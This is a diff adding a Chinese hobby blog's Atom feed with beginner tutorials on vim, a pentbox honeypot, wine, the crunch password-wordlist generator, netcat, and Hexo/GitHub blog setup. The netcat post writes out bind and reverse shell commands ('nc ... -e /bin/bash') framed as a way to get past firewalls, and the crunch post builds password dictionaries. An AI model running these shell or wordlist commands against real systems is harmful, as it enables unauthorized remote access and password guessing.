@@ -1,0 +1,197 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>haclmker</title>
+  
+  <subtitle>haclmker</subtitle>
+  <link href="http://example.com/atom.xml" rel="self"/>
+  
+  <link href="http://example.com/"/>
+  <updated>2021-09-07T02:14:49.704Z</updated>
+  <id>http://example.com/</id>
+  
+  <author>
+    <name>haclmker</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>vim</title>
+    <link href="http://example.com/2021/090426382.html"/>
+    <id>http://example.com/2021/090426382.html</id>
+    <published>2021-09-03T19:40:00.000Z</published>
+    <updated>2021-09-07T02:14:49.704Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h1><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>vim是什么？vim是古老的编辑器。那vim都很古老了为什么要来介绍？你要记住vim编辑器很强！</p><h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><p>一般linux都自带vim编辑器，如果你的linux没有安装那就安装一下。</p><pre><code>sudo apt-get install vim</code></pre><h2 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h2><h3 id="编辑一个文件："><a href="#编辑一个文件：" class="headerlink" title="编辑一个文件："></a>编辑一个文件：</h3><p>以a.c为例子</p><pre><code>vim a.c</code></pre><h3 id="键盘技巧："><a href="#键盘技巧：" class="headerlink" title="键盘技巧："></a>键盘技巧：</h3><p><img src="/images/pasted-21.png" alt="upload successful"><br>使用这些快捷键是在普通模式下，并不是在输入模式下。退出输入模式按键盘左上角的Esc键。</p><h3 id="“-”用法："><a href="#“-”用法：" class="headerlink" title="“:”用法："></a>“:”用法：</h3><p>保存：在普通模式输入英文的这个符号”:” ，再输入w。最后回车。(:w)<br><br>退出：在普通模式输入英文的这个符号”:”,在输入q。最后回车。(:q)<br><br>保存并退出：跟上面差不多，可以缩写。(:wq)<br><br>移动行数：在普通模式输入英文的这个符号”:”,在输入行数。最后回车。(以移动到行数1位例子:1)<br></p><h3 id="查找字符："><a href="#查找字符：" class="headerlink" title="查找字符："></a>查找字符：</h3><p>在普通模式输入英文的这个符号”?”,再输入要查找的字符。最后回车。(以查找include为例子?include)</p><h2 id="结言："><a href="#结言：" class="headerlink" title="结言："></a>结言：</h2><p>vim的功能和强大之处还有很多，本期就介绍这么多。<br>如果你喜欢我博文的话，就订阅我的srr吧！欢迎打赏请作者喝一杯冰可乐吧！</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;vim&quot;&gt;&lt;a href=&quot;#vim&quot; class=&quot;headerlink&quot; title=&quot;vim&quot;&gt;&lt;/a&gt;vim&lt;/h1&gt;&lt;h2 id=&quot;介绍：&quot;&gt;&lt;a href=&quot;#介绍：&quot; class=&quot;headerlink&quot; title=&quot;介绍：&quot;&gt;&lt;/a&gt;介绍：&lt;/h</summary>
+      
+    
+    
+    
+    <category term="kali linux" scheme="http://example.com/categories/kali-linux/"/>
+    
+    <category term="linux" scheme="http://example.com/categories/kali-linux/linux/"/>
+    
+    
+    <category term="编辑器" scheme="http://example.com/tags/%E7%BC%96%E8%BE%91%E5%99%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Honeypot</title>
+    <link href="http://example.com/2021/082618155.html"/>
+    <id>http://example.com/2021/082618155.html</id>
+    <published>2021-08-26T06:05:00.000Z</published>
+    <updated>2021-09-08T05:10:10.616Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Honeypot"><a href="#Honeypot" class="headerlink" title="Honeypot"></a>Honeypot</h1><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>什么 Honeypot， Honeypot是一种蜜罐工具。什么是蜜罐？在以前，蜜罐是用来抓熊的。通过伪装成“食物”引诱熊前来享用，最后猎人再将熊一举拿下。到了今天，蜜罐技术已经成为网络安全中的一种入侵诱饵，目的是引诱黑客前来攻击，并收集黑客相关的证据和信息。</p><h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><p>蜜罐一般用于linux系统，所以就介绍linux系统下的安装。<br>下载pentbox-1.8。</p><pre><code>wget http://downloads.sourceforge.net/project/pentbox18realised/pentbox-1.8.tar.gz</code></pre><p>解压：</p><pre><code>tar -zxvf pentbox-1.8.tar.gz</code></pre><p>进入pentbox-1.8目录：</p><pre><code>cd pentbox-1.8</code></pre><p>安装ruby:</p><pre><code>sudo apt-get install ruby</code></pre><h2 id="启动-amp-使用："><a href="#启动-amp-使用：" class="headerlink" title="启动&amp;使用："></a>启动&amp;使用：</h2><pre><code>sudo ./pentbox.rb</code></pre><p><img src="/images/pasted-10.png" alt="filename already exists, renamed"><br>选择2<br><img src="/images/pasted-11.png" alt="filename already exists, renamed"><br>选择3<br><img src="/images/pasted-12.png" alt="filename already exists, renamed"></p><h3 id="选项1"><a href="#选项1" class="headerlink" title="选项1"></a>选项1</h3><p>如果第一次用，选一<br><img src="/images/pasted-13.png" alt="filename already exists, renamed"><br>访问<a href="127.0.0.1">127.0.0.1</a><br><img src="/images/pasted-14.png" alt="filename already exists, renamed"><br>回看终端<br><img src="/images/pasted-15.png" alt="filename already exists, renamed"><br>这里就能看到访问者的信息了</p><h3 id="选项2"><a href="#选项2" class="headerlink" title="选项2"></a>选项2</h3><p>选二<br><img src="/images/pasted-16.png" alt="filename already exists, renamed"><br>这里填要开启的端口，本次测试以80端口为例子。<br><img src="/images/pasted-17.png" alt="filename already exists, renamed"><br>这里填要展示的信息<br><img src="/images/pasted-18.png" alt="filename already exists, renamed"><br>选y开启日志，主意要再次回车<br><img src="/images/pasted-19.png" alt="filename already exists, renamed"><br>选y开启警报</p><hr><p>用浏览器访问本地地址，就能看到你所设置展示的内容。记录信息如上。</p><h1 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h1><p>如果你喜欢我博文的话，就订阅我的srr吧！欢迎打赏请作者喝一杯冰可乐吧！</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;Honeypot&quot;&gt;&lt;a href=&quot;#Honeypot&quot; class=&quot;headerlink&quot; title=&quot;Honeypot&quot;&gt;&lt;/a&gt;Honeypot&lt;/h1&gt;&lt;h2 id=&quot;介绍：&quot;&gt;&lt;a href=&quot;#介绍：&quot; class=&quot;headerlink&quot; ti</summary>
+      
+    
+    
+    
+    <category term="kali linux" scheme="http://example.com/categories/kali-linux/"/>
+    
+    
+    <category term="网络渗透" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="pentbox" scheme="http://example.com/tags/pentbox/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linxu运行exe文件</title>
+    <link href="http://example.com/2021/082452148.html"/>
+    <id>http://example.com/2021/082452148.html</id>
+    <published>2021-08-24T06:02:00.000Z</published>
+    <updated>2021-08-26T14:57:20.747Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="linux运行exe文件"><a href="#linux运行exe文件" class="headerlink" title="linux运行exe文件"></a>linux运行exe文件</h1><p>众所周知linux可执行文件与Windows不同。但是在特殊情况下要运行exe文件怎么样？难道要开虚拟机或问朋友借电脑？(linux为主力机系统下)NO，不至于。因为linux下可以借助工具来运行exe文件，它就是红酒杯<a href="https://sourceforge.net/projects/wine/">wine</a>(供参考)。</p><h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><p>运行以下命令，如果不行就换源。怎么换？<a href="www.baidu.com">百度</a></p><pre><code>sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine-bin:i386</code></pre><h2 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h2><p>把方正粗黑宋简体.ttf的字体文件移动到～/.wine/drive_c/windows/Fonts目录下(方正粗黑宋简体.ttf<a href="https://github.com/haclm/linxu_wine_tff">下载</a>) </p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>以a.exe为例子</p><pre><code>wine a.exe</code></pre><h2 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h2><p>如果你喜欢我博文的话，就订阅我的srr吧！欢迎打赏请作者喝一杯冰可乐吧！</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;linux运行exe文件&quot;&gt;&lt;a href=&quot;#linux运行exe文件&quot; class=&quot;headerlink&quot; title=&quot;linux运行exe文件&quot;&gt;&lt;/a&gt;linux运行exe文件&lt;/h1&gt;&lt;p&gt;众所周知linux可执行文件与Windows不同。但是在特殊</summary>
+      
+    
+    
+    
+    <category term="kali linux" scheme="http://example.com/categories/kali-linux/"/>
+    
+    <category term="linux" scheme="http://example.com/categories/kali-linux/linux/"/>
+    
+    
+    <category term="wine" scheme="http://example.com/tags/wine/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>crunch</title>
+    <link href="http://example.com/2021/082022371.html"/>
+    <id>http://example.com/2021/082022371.html</id>
+    <published>2021-08-19T20:31:00.000Z</published>
+    <updated>2021-08-20T05:12:17.647Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h1><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>crunch 是kali linux下自带一款工具，用于生成字典。</p><h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><p>linux ：<pre><code>sudo apt install crunch</code></pre></p><h2 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h2><h3 id="基本语法："><a href="#基本语法：" class="headerlink" title="基本语法："></a>基本语法：</h3><p><code> crunch &lt;min&gt; &lt;max&gt; [options]</code></p><h3 id="参数详解："><a href="#参数详解：" class="headerlink" title="参数详解："></a>参数详解：</h3><blockquote><p>min   设定最小字符串长度（必选）<br><br>     max    设定最大字符串长度（必选）<br><br>      oprions<br><br>     -b     指定文件输出的大小，避免字典文件过大 <br><br>     -c     指定文件输出的行数，即包含密码的个数<br><br>     -d     限制相同元素出现的次数<br><br>     -e     定义停止字符，即到该字符串就停止生成<br><br>     -f     调用库文件（/etc/share/crunch/charset.lst）<br><br>     -i     改变输出格式，即aaa,aab -&gt; aaa,baa<br><br>     -I     通常与-t联合使用，表明该字符为实义字符<br><br>     -m     通常与-p搭配<br><br>     -o     将密码保存到指定文件<br><br>     -p     指定元素以组合的方式进行<br><br>     -q     读取密码文件，即读取pass.txt<br><br>     -r     定义重某一字符串重新开始<br><br>     -s     指定一个开始的字符，即从自己定义的密码xxxx开始<br><br>     -t     指定密码输出的格式<br><br>     -u     禁止打印百分比（必须为最后一个选项）<br><br>     -z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z<br></p></blockquote><h3 id="特殊字符："><a href="#特殊字符：" class="headerlink" title="特殊字符："></a>特殊字符：</h3><blockquote><p>   %      代表数字<br><br>     ^      代表特殊符号<br><br>     @      代表小写字母<br><br>     ,      代表大写字符<br></p></blockquote><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><h4 id="0x01生成八位数的纯数字字典："><a href="#0x01生成八位数的纯数字字典：" class="headerlink" title="0x01生成八位数的纯数字字典："></a>0x01生成八位数的纯数字字典：</h4><pre><code>crunch 8 8 0123456789</code></pre><h4 id="0x02生成最高八位最低4位字母字典："><a href="#0x02生成最高八位最低4位字母字典：" class="headerlink" title="0x02生成最高八位最低4位字母字典："></a>0x02生成最高八位最低4位字母字典：</h4><pre><code>crunch 4 8 </code></pre><h4 id="0x03生成十一位的指定字符串字典（如手机号等）："><a href="#0x03生成十一位的指定字符串字典（如手机号等）：" class="headerlink" title="0x03生成十一位的指定字符串字典（如手机号等）："></a>0x03生成十一位的指定字符串字典（如手机号等）：</h4><pre><code>crunch 11 11 -t 139%%%%%%%%</code></pre><h4 id="0x04生成四位带空格逗号封号（空格，；）字典："><a href="#0x04生成四位带空格逗号封号（空格，；）字典：" class="headerlink" title="0x04生成四位带空格逗号封号（空格，；）字典："></a>0x04生成四位带空格逗号封号（空格，；）字典：</h4><pre><code>crunch 4 4 "ab"</code></pre><p>“ 代表空格逗号封号</p><h2 id="结言："><a href="#结言：" class="headerlink" title="结言："></a>结言：</h2><p>如果你喜欢我博文的话，就订阅我的srr吧！欢迎打赏请作者喝一杯冰可乐吧！</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;crunch&quot;&gt;&lt;a href=&quot;#crunch&quot; class=&quot;headerlink&quot; title=&quot;crunch&quot;&gt;&lt;/a&gt;crunch&lt;/h1&gt;&lt;h2 id=&quot;介绍：&quot;&gt;&lt;a href=&quot;#介绍：&quot; class=&quot;headerlink&quot; title=&quot;介绍：</summary>
+      
+    
+    
+    
+    <category term="kali linux" scheme="http://example.com/categories/kali-linux/"/>
+    
+    
+    <category term="网络渗透" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="字典生成" scheme="http://example.com/tags/%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>netcat</title>
+    <link href="http://example.com/2021/080857223.html"/>
+    <id>http://example.com/2021/080857223.html</id>
+    <published>2021-08-07T23:05:00.000Z</published>
+    <updated>2021-08-10T07:50:00.939Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h1><h2 id="netcat的简介"><a href="#netcat的简介" class="headerlink" title="netcat的简介"></a>netcat的简介</h2><p>netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，可以在脚本中以多种方式使用它。</p><h2 id="netcat的安装"><a href="#netcat的安装" class="headerlink" title="netcat的安装"></a>netcat的安装</h2><h3 id="linux安装："><a href="#linux安装：" class="headerlink" title="linux安装："></a>linux安装：</h3><pre><code>sudo apt install netcat</code></pre><h3 id="windows安装："><a href="#windows安装：" class="headerlink" title="windows安装："></a>windows安装：</h3><p>点击这里<a href="https://eternallybored.org/misc/netcat/">netcat</a>下载netcat的文件和配置。</p><h4 id="windows配置："><a href="#windows配置：" class="headerlink" title="windows配置："></a>windows配置：</h4><p>进入下载netcat的目录，按住左shift+鼠标右键选择powershell输入：</p><pre><code>.\netcat</code></pre><p>当出现<code>Cmd line:</code>就配置成功，你可以配置环境变量点这里<a href="https://blog.csdn.net/BoomLee/article/details/102563472">怎么设置环境变量</a></p><h2 id="netcat的使用"><a href="#netcat的使用" class="headerlink" title="netcat的使用"></a>netcat的使用</h2><h3 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h3><pre><code>nc -z -v -n 127.0.0.1 21-25</code></pre><p>可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.<br>-z 参数告诉netcat使用0 IO,连接成功后立即关闭连接，不进行数据交换<br>-v 参数指使用冗余选项，即详细输出<br>-n 参数告诉netcat 不使用DNS解析，即仅仅是一串IP数字， 一般如果后面是跟IP数字的话，就带上-n参数；跟着是域名的话，就不带-n参数。</p><h3 id="聊天服务"><a href="#聊天服务" class="headerlink" title="聊天服务"></a>聊天服务</h3><p>服务端(ip=192.168.1.7)：<pre><code>nc -l -p 4444</code></pre>4444是开放的端口<br>客户端:<pre><code>nc 192.168.1.8</code></pre>192.168.1.7是服务端的IP地址<br>客户端和服务端是同一网端下!检测是否在同一网段可以采用互相ping ip<br>可以点击这里查看详细记录<a href="https://zhidao.baidu.com/question/69628323.html">百度教程</a></p><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>例子环境：</p><ul><li>A电脑ip:192.168.1.2</li><li>B电脑ip:192.168.1.3</li></ul><p>A电脑为服务端，B电脑为客户端。以a文件为要发送的文件。服务端要发送a文件到客户端，客户端则接受服务端发来的a文件。<br>A电脑命令如下：</p><pre><code>nc -l -p 4444 < a </code></pre><p>B电脑命令如下:</p><pre><code> nc 192.168.1.2 4444 > a</code></pre><p>反正则调换一下</p><h3 id="shell连接"><a href="#shell连接" class="headerlink" title="shell连接"></a>shell连接</h3><h4 id="1-正向连接"><a href="#1-正向连接" class="headerlink" title="1:正向连接"></a>1:正向连接</h4><h6 id="例子环境："><a href="#例子环境：" class="headerlink" title="例子环境："></a>例子环境：</h6><ul><li>A电脑ip:192.168.1.2</li><li>B电脑ip:192.168.1.3<h6 id="例子情况-用B电脑连接A电脑shell"><a href="#例子情况-用B电脑连接A电脑shell" class="headerlink" title="例子情况:用B电脑连接A电脑shell"></a>例子情况:用B电脑连接A电脑shell</h6></li><li>A电脑为服务端</li><li>B电脑为客户端<br>服务端命令如下：<pre><code>nc -l -p 4444 -e /bin/bash</code></pre>客户端命令如下：<pre><code>nc 192.168.1.2</code></pre><h4 id="2-反面连接-用于绕过防火墙"><a href="#2-反面连接-用于绕过防火墙" class="headerlink" title="2.反面连接(用于绕过防火墙)"></a>2.反面连接(用于绕过防火墙)</h4><h6 id="例子环境：-1"><a href="#例子环境：-1" class="headerlink" title="例子环境："></a>例子环境：</h6></li><li>A电脑ip:192.168.1.2</li><li>B电脑ip:192.168.1.3<h6 id="例子情况："><a href="#例子情况：" class="headerlink" title="例子情况："></a>例子情况：</h6></li><li>1.A机器连接B机器的shell，如果按照正向shell的做法，应该是把A当成netcat的客户端，把B当成netcat的服务端，在B上用-l参数监听输入的链接。</li><li>2.但是如果防火墙屏蔽了输入，只允许输出，那么这时候就是反向shell发挥作用的时候了。</li><li>3.反向shell的做法是把A当成netcat的客户端，把B当成netcat的客户端，然后在A上用-l参数监听netcat的链接。</li></ul><p>A电脑命令如下：</p><pre><code>nc -l -p 20000</code></pre><p>B电脑命令如下:</p><pre><code>nc 192.168.1.3 4444 -e /bin/bash</code></pre><h2 id="结言"><a href="#结言" class="headerlink" title="结言:"></a>结言:</h2><p>本博文是netcat的基础用法。欢迎订阅rss和打赏，请作者喝一杯冰可乐吧！</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;netcat&quot;&gt;&lt;a href=&quot;#netcat&quot; class=&quot;headerlink&quot; title=&quot;netcat&quot;&gt;&lt;/a&gt;netcat&lt;/h1&gt;&lt;h2 id=&quot;netcat的简介&quot;&gt;&lt;a href=&quot;#netcat的简介&quot; class=&quot;headerlink</summary>
+      
+    
+    
+    
+    <category term="kali linux" scheme="http://example.com/categories/kali-linux/"/>
+    
+    
+    <category term="网络渗透" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="netcat" scheme="http://example.com/tags/netcat/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>hexo admin写博客</title>
+    <link href="http://example.com/2021/080627682.html"/>
+    <id>http://example.com/2021/080627682.html</id>
+    <published>2021-08-06T02:36:00.000Z</published>
+    <updated>2021-08-08T08:31:14.963Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="hexo-admin写博客"><a href="#hexo-admin写博客" class="headerlink" title="hexo_admin写博客"></a>hexo_admin写博客</h1><p>写博客是不是很头疼？不好实时预览。用那黑乎乎的vim编辑器，看起来很头疼。那么我们不用vim编辑器用什么编辑器？用hexo admin！hexo admin编辑器可以实时预览对新手很好。告诉你一个秘密本博文也是用hexo admin写的！好了废话不多说了。let’s go.本教程用linux为例子，Windows的话也差不多万变不离其宗嘛</p><h2 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h2><ul><li>有hexo的电脑//电脑上没有安装hexo可以看上一期</li><li>电脑能联网 <h2 id="安装hexo-admin"><a href="#安装hexo-admin" class="headerlink" title="安装hexo admin"></a>安装hexo admin</h2> 运行以下命令：<pre><code>cd blog && npm install hexo-admin --save</code></pre>    cd blog 是进入blog目录</li></ul><h2 id="运行："><a href="#运行：" class="headerlink" title="运行："></a>运行：</h2><p>运行以下命令来启动hexo_admin</p><pre><code>hexo s</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>进入<a href="hocalhost:4000/amdin">自己本地的博客</a><br><img src="/images/pasted-4.png" alt="filename already exists, renamed"><br>这个是设密码，输入内容后下滑，找到生成的代码，复制到blog目录’_config.yml’中保存并重启hexo，打来hexo-admin的界面。</p><h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><p>在posts 里面新建一个博文，就可以写。</p><h3 id="markdown语法"><a href="#markdown语法" class="headerlink" title="markdown语法"></a>markdown语法</h3><p>教程<a href="http://ibruce.info/2013/11/26/markdown/">不如</a></p><h2 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h2><p>这期教程就到了，欢迎订阅rss和打赏。请作者喝一杯冰可乐吧！</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;hexo-admin写博客&quot;&gt;&lt;a href=&quot;#hexo-admin写博客&quot; class=&quot;headerlink&quot; title=&quot;hexo_admin写博客&quot;&gt;&lt;/a&gt;hexo_admin写博客&lt;/h1&gt;&lt;p&gt;写博客是不是很头疼？不好实时预览。用那黑乎乎的vim</summary>
+      
+    
+    
+    
+    <category term="博客教学" scheme="http://example.com/categories/%E5%8D%9A%E5%AE%A2%E6%95%99%E5%AD%A6/"/>
+    
+    
+    <category term="hexo" scheme="http://example.com/tags/hexo/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>教学GitHub博客搭建</title>
+    <link href="http://example.com/2021/080511190.html"/>
+    <id>http://example.com/2021/080511190.html</id>
+    <published>2021-08-05T01:02:59.000Z</published>
+    <updated>2021-08-07T09:30:33.023Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="GitHub博客教学"><a href="#GitHub博客教学" class="headerlink" title="GitHub博客教学"></a>GitHub博客教学</h1><h2 id="要点如下："><a href="#要点如下：" class="headerlink" title="要点如下："></a>要点如下：</h2><ul><li>1.GitHub账号</li><li>2.linux/windows/mac 电脑<h5 id="let’s-go"><a href="#let’s-go" class="headerlink" title="let’s go"></a>let’s go</h5><h2 id="GitHub账号"><a href="#GitHub账号" class="headerlink" title="GitHub账号"></a>GitHub账号</h2>有GitHub账号就登录没有就注册一下，这里建议用手机版Firefox注册成功率比较高。登录GitHub账号，并点击右上角头像右旁的的向下三角形</li></ul><p><img src="/images/image.png" alt="upload successful"><br>之后再点击出现菜单的第二的选项 your repositories<br><img src="/images/pasted-1.png" alt="filename already exists, renamed"><br>点击new<br><img src="/images/pasted-2.png" alt="filename already exists, renamed"><br>Repository name 下面的方框填你GitHub的用户名.github.io</p><blockquote><p>你的用户名.github.io</p></blockquote><p>格式一定要是这样的！一定要是！一定要是！重要的事说三遍！之后选择绿色按键Create repository</p><h2 id="linux本地设置"><a href="#linux本地设置" class="headerlink" title="linux本地设置"></a>linux本地设置</h2><p>先安装hexo</p><pre><code> npm install -g hexo-cli </code></pre><p>安装git</p><pre><code> sudo apt install git </code></pre> <p>安装nodejs linux_nodejs<a href="https://www.cnblogs.com/cirry/p/13599472.html">菜小牛</a><br>安装ssh</p><pre><code> sudo apt install ssh </pre></code><h3 id="连接GitHub"><a href="#连接GitHub" class="headerlink" title="连接GitHub"></a>连接GitHub</h3><pre><code>git config --global user.name "GitHub用户名"git config --global user.email "GitHub邮箱"</code></pre><h3 id="创建ssh"><a href="#创建ssh" class="headerlink" title="创建ssh"></a>创建ssh</h3><pre><code>ssh-keygen -t rsa -C "GitHub邮箱"</code></pre><h3 id="添加秘钥linux"><a href="#添加秘钥linux" class="headerlink" title="添加秘钥linux"></a>添加秘钥linux</h3><p>在~/.ssh目录下,查看秘钥<br> <pre><code>cd ~/.ssh && cat id_rsa.pub</code></pre></p><p>复制id_rsa.pub里的内容，登录GitHub并点击Settings。进入Settings页面，选择左边的 SSH and GPG。Title随便起一个，粘贴id_rsa.pub内容到Key中，点击Add SSH Key完成添加。<br><img src="/images/pasted-3.png" alt="filename already exists, renamed"></p><h3 id="验证连接"><a href="#验证连接" class="headerlink" title="验证连接"></a>验证连接</h3><pre><code>ssh -T git@github.com </code></pre><p>输入yes<br>显示 “Hi xxx! You’ve successfully……” 即连接成功。</p><h3 id="Hexo-初始化"><a href="#Hexo-初始化" class="headerlink" title="Hexo 初始化"></a>Hexo 初始化</h3><p>首先创建一个放配置的文件夹，这里我就以blog为例子。<br>创建文件夹和进入文件夹以及配置我就用一条命令了，不然有点杂乱。</p><pre><code>mkdir blog && cd blog && hexo init && npm install</code></pre><p>完成之后输入下面的命令，启动本地预览:</p><pre><code>hexo g && hexo s</code></pre><p>之后访问<a href="http://localhost:4000/,%E5%87%BA%E7%8E%B0Hexo%E9%A1%B5%E9%9D%A2%E5%B0%B1%E8%AF%B4%E6%98%8E%E6%88%90%E5%8A%9F%E4%BA%86%E3%80%82%E8%BF%99%E5%8F%AA%E6%98%AF%E6%9C%AC%E5%9C%B0%E7%BD%91%E9%A1%B5%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E6%8A%8A%E4%BB%96%E9%83%A8%E7%BD%B2%E5%88%B0GitHub%E4%B8%8A%E3%80%82">http://localhost:4000/,出现Hexo页面就说明成功了。这只是本地网页，所以我们要把他部署到GitHub上。</a></p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>安装hexo-deployer-git</p><pre><code>npm install hexo-deployer-git --save</code></pre><p>之后在blog目录下的_config.yml结尾添加一些代码</p><blockquote><p>deploy:<br>  type: git<br>  repo:  <a href="https://github.com/%E7%94%A8%E6%88%B7%E5%90%8D/h%E7%94%A8%E6%88%B7%E5%90%8D.github.io.git">https://github.com/用户名/h用户名.github.io.git</a><br>  branch: master</p></blockquote><p>  保存一下，之后执行下面命令部署到GitHub上：<br> <pre><code>hexo d</code></pre></p><p>  之后终端要求你输入GitHub的账号和密码，到时候输入一下就行了。<br>完成之后打开之前创建的用户名.github.io</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>进入blog的目录，在此打开终端，创建博文</p><pre><code>hexo new "my new post"</code></pre><p>之后进入source文件夹有一个my new post.md的文件，就可以用vim等编辑器撰写博客了。<br>写完了要重新发布/部署</p><pre><code>hexo g && hexo d</code></pre><h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><p>如果你觉得默认的主题不好看，你可以换一个主题。<br>可以参考这个博客<a href="https://www.cnblogs.com/guixinchn/p/13549768.html">咕咕星</a></p><h2 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h2><p>如果你觉得对你有用的话，欢迎订阅我的SSR和打赏我的微信哦。你的赏识就是我前进的动力。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;GitHub博客教学&quot;&gt;&lt;a href=&quot;#GitHub博客教学&quot; class=&quot;headerlink&quot; title=&quot;GitHub博客教学&quot;&gt;&lt;/a&gt;GitHub博客教学&lt;/h1&gt;&lt;h2 id=&quot;要点如下：&quot;&gt;&lt;a href=&quot;#要点如下：&quot; class=&quot;he</summary>
+      
+    
+    
+    
+    <category term="博客教学" scheme="http://example.com/categories/%E5%8D%9A%E5%AE%A2%E6%95%99%E5%AD%A6/"/>
+    
+    
+    <category term="hexo" scheme="http://example.com/tags/hexo/"/>
+    
+  </entry>
+  
+</feed>
